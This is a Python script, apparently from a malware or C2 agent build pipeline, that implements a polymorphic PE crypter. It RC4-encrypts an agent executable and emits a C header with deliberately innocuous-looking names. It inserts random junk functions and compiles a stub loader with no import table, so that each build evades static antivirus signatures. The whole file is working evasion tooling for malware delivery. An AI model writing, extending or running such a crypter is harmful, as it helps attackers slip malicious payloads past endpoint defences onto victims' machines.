#!/usr/bin/env python3
"""
pe_crypt.py — Polymorphic PE crypter.

Takes a compiled agent .exe, encrypts it with RC4 (derived key from seed),
and generates a stub loader that decrypts + reflectively loads the agent
in memory.

The stub has ZERO IAT imports — all APIs resolved at runtime via PEB walk.
Each invocation produces a unique binary (different seed → different key →
different ciphertext → no static signature match).

Usage:
    python pe_crypt.py --input builds/agent_payload.exe --output builds/agent.exe

Called automatically by build_agent_c.py during the two-pass build.
"""

import argparse
import os
import random
import secrets
import shutil
import string
import struct
import subprocess
import sys
import tempfile
from pathlib import Path


def _derive_key(seed: bytes, key_len: int = 256) -> bytes:
    """
    Derive an RC4 key from a seed using DJB2-based expansion.
    Extracts all 4 bytes from each 32-bit hash for proper entropy.
    MUST match the C implementation in stub_loader.c exactly.
    """
    key = bytearray(key_len)
    for i in range(0, key_len, 4):
        h = 5381
        block = i >> 2
        for j in range(len(seed)):
            h = (((h << 5) + h) ^ (seed[j] + block)) & 0xFFFFFFFF
        key[i] = h & 0xFF
        if i + 1 < key_len: key[i + 1] = (h >> 8) & 0xFF
        if i + 2 < key_len: key[i + 2] = (h >> 16) & 0xFF
        if i + 3 < key_len: key[i + 3] = (h >> 24) & 0xFF
    return bytes(key)


def rc4_crypt(data: bytes, key: bytes) -> bytes:
    """RC4 encrypt/decrypt (symmetric). Key derived from seed."""
    # KSA
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]

    # PRGA
    out = bytearray(len(data))
    ii = jj = 0
    for k in range(len(data)):
        ii = (ii + 1) & 0xFF
        jj = (jj + S[ii]) & 0xFF
        S[ii], S[jj] = S[jj], S[ii]
        out[k] = data[k] ^ S[(S[ii] + S[jj]) & 0xFF]
    return bytes(out)


def generate_stub_payload_h(encrypted: bytes, seed: bytes) -> str:
    """Generate C header with encrypted payload and seed (not the key)."""

    def format_bytes(data: bytes, var_name: str, per_line: int = 16) -> str:
        lines = []
        lines.append(f"static unsigned char {var_name}[] = {{")
        for i in range(0, len(data), per_line):
            chunk = data[i:i + per_line]
            hex_vals = ", ".join(f"0x{b:02X}" for b in chunk)
            comma = "," if i + per_line < len(data) else ""
            lines.append(f"    {hex_vals}{comma}")
        lines.append("};")
        return "\n".join(lines)

    # Use innocuous variable names — looks like embedded resources
    payload_arr = format_bytes(encrypted, "g_res_data")
    seed_arr = format_bytes(seed, "g_res_cfg")

    return f"""/*
 * stub_payload.h — Auto-generated resource data.
 * DO NOT EDIT — regenerated on every build.
 */
#ifndef STUB_PAYLOAD_H
#define STUB_PAYLOAD_H

{payload_arr}

{seed_arr}

#define RES_DATA_SIZE {len(encrypted)}u
#define RES_CFG_SIZE  {len(seed)}u

#endif /* STUB_PAYLOAD_H */
"""


def generate_junk_functions() -> str:
    """Generate random junk C functions to vary the stub binary."""
    rng = random.SystemRandom()
    funcs = []
    num_funcs = rng.randint(3, 7)

    for i in range(num_funcs):
        name = "".join(rng.choices(string.ascii_lowercase, k=rng.randint(6, 12)))
        ret_type = rng.choice(["int", "unsigned int", "unsigned long"])
        body_ops = []
        var = "x"
        body_ops.append(f"    {ret_type} {var} = {rng.randint(1, 0xFFFF)};")
        for _ in range(rng.randint(4, 10)):
            op = rng.choice(["+", "^", "*", "-", "<<", ">>"])
            val = rng.randint(1, 255)
            if op in ("<<", ">>"):
                val = rng.randint(1, 15)
            body_ops.append(f"    {var} = {var} {op} {val};")
        body_ops.append(f"    return {var};")

        funcs.append(
            f"static __attribute__((used)) {ret_type} {name}(void) {{\n"
            + "\n".join(body_ops)
            + "\n}\n"
        )

    return "\n".join(funcs)


def build_stub(
    stub_src: Path,
    payload_header: Path,
    output_exe: Path,
    arch: str = "x64",
    junk_code: str = "",
    debug: bool = False,
) -> Path:
    """Compile the stub loader with the encrypted payload.

    CRITICAL: The stub is compiled with -nostdlib and a custom entry point.
    This means ZERO CRT code, ZERO default IAT imports.
    No GetModuleHandleA, no GetProcAddress, no VirtualAlloc in the IAT.
    All APIs are resolved at runtime via PEB walk + export table parsing.
    """

    cc = "x86_64-w64-mingw32-gcc" if arch == "x64" else "i686-w64-mingw32-gcc"
    strip_cmd = "x86_64-w64-mingw32-strip" if arch == "x64" else "i686-w64-mingw32-strip"

    if not shutil.which(cc):
        raise FileNotFoundError(f"{cc} not found. Install mingw-w64.")

    # Write junk code to a separate file if any
    junk_path = payload_header.parent / "stub_junk.h"
    junk_path.write_text(
        f"/* Auto-generated junk code for polymorphism */\n{junk_code}\n"
    )

    cmd = [
        cc,
        f"-I{payload_header.parent}",
        "-Wall", "-Os", "-s",
        "-fno-asynchronous-unwind-tables",
        "-fno-ident",
        "-fdata-sections",
        "-ffunction-sections",
        "-fno-stack-protector",       # No stack canary (__security_cookie)
        "-fno-builtin",               # No implicit memcpy/memset calls
        "-DWIN32_LEAN_AND_MEAN",
        *((["-DSTUB_DEBUG"] if debug else [])),
        "-include", str(junk_path),
        "-o", str(output_exe),
        str(stub_src),
        # ── CRITICAL: No CRT, no default libs ──
        "-nostdlib",                   # No libc, no CRT startup
        "-Wl,-e,_stub_entry",         # Direct entry point (no WinMainCRTStartup)
        "-Wl,--subsystem,windows",
        "-Wl,--gc-sections",
        # No -lkernel32, no -static-libgcc — ZERO IAT imports
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        raise RuntimeError(f"Stub compilation failed:\n{result.stderr}")

    # Strip symbols
    if shutil.which(strip_cmd):
        subprocess.run([strip_cmd, "--strip-all", str(output_exe)], capture_output=True)

    return output_exe


def crypt_pe(
    input_pe: Path,
    output_exe: Path,
    stub_dir: Path,
    arch: str = "x64",
    key_size: int = 32,
    debug: bool = False,
) -> Path:
    """
    Full crypter pipeline:
    1. Read input PE
    2. Generate random seed
    3. Derive RC4 key from seed
    4. RC4 encrypt payload
    5. Generate stub_payload.h with encrypted data + seed (NOT the key)
    6. Compile stub → output
    """
    # Read the agent PE
    pe_bytes = input_pe.read_bytes()
    pe_size = len(pe_bytes)

    # Generate random seed (64 bytes — stored in the stub)
    seed = secrets.token_bytes(64)

    # Derive RC4 key from seed (256 bytes — NOT stored anywhere)
    rc4_key = _derive_key(seed, 256)

    # Encrypt with RC4
    encrypted = rc4_crypt(pe_bytes, rc4_key)

    # Verify round-trip
    decrypted = rc4_crypt(encrypted, rc4_key)
    assert decrypted == pe_bytes, "RC4 round-trip failed!"

    # Create temp build directory
    build_dir = Path(tempfile.mkdtemp(prefix="stub_build_"))

    try:
        # Generate payload header (contains seed, NOT the key)
        header_content = generate_stub_payload_h(encrypted, seed)
        header_path = build_dir / "stub_payload.h"
        header_path.write_text(header_content)

        # Generate junk code for polymorphism
        junk = generate_junk_functions()

        # Copy stub source
        stub_src = stub_dir / "stub_loader.c"
        if not stub_src.exists():
            raise FileNotFoundError(f"Stub source not found: {stub_src}")

        # Compile
        build_stub(stub_src, header_path, output_exe, arch, junk, debug=debug)

        print(f"[+] Crypter: {pe_size} bytes payload → "
              f"{output_exe.stat().st_size} bytes stub "
              f"(RC4, seed: {seed[:8].hex()}...)")

        return output_exe

    finally:
        shutil.rmtree(build_dir, ignore_errors=True)


def main():
    parser = argparse.ArgumentParser(description="Polymorphic PE crypter")
    parser.add_argument("--input", type=Path, required=True,
                        help="Input PE file to encrypt")
    parser.add_argument("--output", type=Path, required=True,
                        help="Output encrypted stub exe")
    parser.add_argument("--stub-dir", type=Path, default=None,
                        help="Directory containing stub_loader.c")
    parser.add_argument("--arch", choices=["x64", "x86"], default="x64")
    parser.add_argument("--key-size", type=int, default=32,
                        help="Seed size in bytes (default: 32)")
    args = parser.parse_args()

    if not args.input.exists():
        print(f"[!] Input file not found: {args.input}", file=sys.stderr)
        sys.exit(1)

    stub_dir = args.stub_dir
    if not stub_dir:
        # Default: look for agent_c/stub/ relative to this script
        stub_dir = Path(__file__).parent.parent / "agent_c" / "stub"

    args.output.parent.mkdir(parents=True, exist_ok=True)

    crypt_pe(args.input, args.output, stub_dir, args.arch, args.key_size)


if __name__ == "__main__":
    main()
